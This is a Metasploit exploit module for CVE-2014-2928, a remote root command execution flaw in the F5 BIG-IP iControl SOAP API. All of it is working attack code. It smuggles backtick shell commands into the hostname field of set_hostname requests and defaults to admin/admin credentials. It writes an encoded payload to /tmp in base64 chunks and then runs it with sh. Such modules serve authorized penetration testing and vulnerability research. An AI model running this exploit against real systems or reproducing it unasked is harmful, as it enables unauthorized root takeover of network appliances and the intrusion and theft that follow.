##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "F5 iControl Remote Root Command Execution",
      'Description'    => %q{
        This module exploits an authenticated remote command execution
        vulnerability in the F5 BIGIP iControl API (and likely other
        F5 devices).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'bperry' # Discovery, Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2014-2928'],
          ['URL', 'http://support.f5.com/kb/en-us/solutions/public/15000/200/sol15220.html']
        ],
      'Platform'       => ['unix'],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['F5 iControl', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Sep 17 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          Opt::RPORT(443),
          OptBool.new('SSL', [true, 'Use SSL', true]),
          OptString.new('TARGETURI', [true, 'The base path to the iControl installation', '/']),
          OptString.new('USERNAME', [true, 'The username to authenticate with', 'admin']),
          OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin'])
        ], self.class)
  end

  def check
    get_hostname = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
    <SOAP-ENV:Body>
    <n1:get_hostname xmlns:n1="urn:iControl:System/Inet" />
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>
    }

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),
      'method' => 'POST',
      'data' => get_hostname,
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    })

    res.body =~ /y:string">(.*)<\/return/
    hostname = $1
    send_cmd("whoami")

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),
      'method' => 'POST',
      'data' => get_hostname,
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    })

    res.body =~ /y:string">(.*)<\/return/
    new_hostname = $1

    if new_hostname == "root.a.b"
      pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
        <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
        <SOAP-ENV:Body>
        <n1:set_hostname xmlns:n1="urn:iControl:System/Inet">
        <hostname>#{hostname}</hostname>
        </n1:set_hostname>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
      }

      send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),
        'method' => 'POST',
        'data' => pay,
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      })

      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def send_cmd(cmd)
    pay = %Q{<?xml version="1.0" encoding="ISO-8859-1"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
      <SOAP-ENV:Body>
      <n1:set_hostname xmlns:n1="urn:iControl:System/Inet">
        <hostname>`#{cmd}`.a.b</hostname>
        </n1:set_hostname>
        </SOAP-ENV:Body>
        </SOAP-ENV:Envelope>
    }

    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'iControl', 'iControlPortal.cgi'),
      'method' => 'POST',
      'data' => pay,
      'username' => datastore['USERNAME'],
      'password' => datastore['PASSWORD']
    })
  end

  def exploit
    filename = Rex::Text.rand_text_alpha_lower(5)

    print_status('Sending payload in chunks, might take a small bit...')
    i = 0
    while i < payload.encoded.length
      cmd = "echo #{Rex::Text.encode_base64(payload.encoded[i..i+4])}|base64 --decode|tee -a /tmp/#{filename}"
      send_cmd(cmd)
      i = i + 5
    end

    print_status('Triggering payload...')

    send_cmd("sh /tmp/#{filename}")
  end
end